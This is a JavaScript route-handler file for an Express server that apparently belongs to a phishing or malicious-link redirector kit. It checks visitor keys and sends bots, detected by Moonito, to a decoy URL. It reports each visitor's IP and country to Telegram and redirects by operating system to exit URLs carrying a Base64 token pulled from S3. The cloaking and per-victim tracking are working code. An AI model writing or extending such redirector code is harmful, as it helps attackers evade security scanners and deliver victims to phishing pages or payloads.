const { GetObjectCommand } = require('@aws-sdk/client-s3');
const config = require('../config/config');
const { s3Client, streamToString } = require('../controllers/tokenController');
const { sendTelegramNotification, getVisitorInfo, getClientIp } = require('../utils/telegramNotifier');
const { processTokenLookup, generateToken } = require('../controllers/tokenController');


const loginHandler = (req, res) => {
    const { id } = req.query;
    if (!id) return res.status(400).send('Missing key or token ID.');

    if (config.AUTH_METHOD === 'Keynotes') {
        if (!config.KEYNOTES.includes(id)) {
            return res.redirect(config.BOT_URL);
        }
        req.session.keynotes = id;
        // Redirect now to /process with the key in the query string
        return res.redirect(`/process?id=${id}`);
    } else {
        // Generate a token and store relevant data in session
        const token = generateToken(id);
        req.session.token = token;
        req.session.redirectData = id;
        req.session.nextStep = 2;
        // Redirect to /process using the generated token
        return res.redirect(`/process?token=${token}&id=${id}`);
    }
};

const processHandler = async (req, res) => {
    // If Moonito indicates a Bot response, immediately redirect to the fallback URL.
    if (config.PASSIVE_MODE_ENABLED) return res.redirect(config.BOT_URL);

    const clientIp = getClientIp(req);

    // Send a Telegram notification with visitor details.
    try {
        const visitor = await getVisitorInfo(clientIp);
        const tokenOrKey = req.query.token || req.query.id || 'Unknown';
        const message = `New Visit Notification from ${visitor.flag} ${visitor.country}\nIP: ${clientIp}\nComment: Visitor with token/key \`${tokenOrKey}\` has reached /process.`;
        sendTelegramNotification(message);
    } catch (err) {
        console.error('Error sending visit notification:', err);
    }

    // Perform token lookup (or key lookup in Keynotes mode) to get the Base64 value.
    try {
        const s3Base64  = await processTokenLookup(req.query.id);
        // Determine the OS-based redirect URL and append the Base64 value if enabled.
        const osRedirectUrl = getOSRedirectUrl(req);
        const finalRedirectUrl = appendBase64ToExitUrl(osRedirectUrl, s3Base64, config.APP_BASE64_ENABLED);
        return res.redirect(finalRedirectUrl);
    } catch (error) {
        console.error('Error processing token lookup:', error.message);
        return res.redirect(config.BOT_URL);
    }
};

// Helper: Determine OS-specific redirect URL based on user-agent.
const getOSRedirectUrl = (req) => {
    const ua = req.headers['user-agent'] || '';
    if (/Windows/.test(ua)) return config.OS_URLS.windows;
    if (/Macintosh/.test(ua)) return config.OS_URLS.mac;
    if (/Android/.test(ua)) return config.OS_URLS.android;
    if (/iPhone|iPad|iOS/.test(ua)) return config.OS_URLS.ios;
    return config.OS_URLS.others;
};

// Helper: Append the Base64 value to the exit URL if configured to do so.
const appendBase64ToExitUrl = (url, base64Value, appBase64Enabled) => {
    if (!appBase64Enabled || !base64Value) return url;
    if (url.endsWith('/')) url = url.slice(0, -1);
    if (base64Value.startsWith('/')) base64Value = base64Value.slice(1);
    return `${url}/${base64Value}`;
};

module.exports = {
    loginHandler,
    processHandler
};
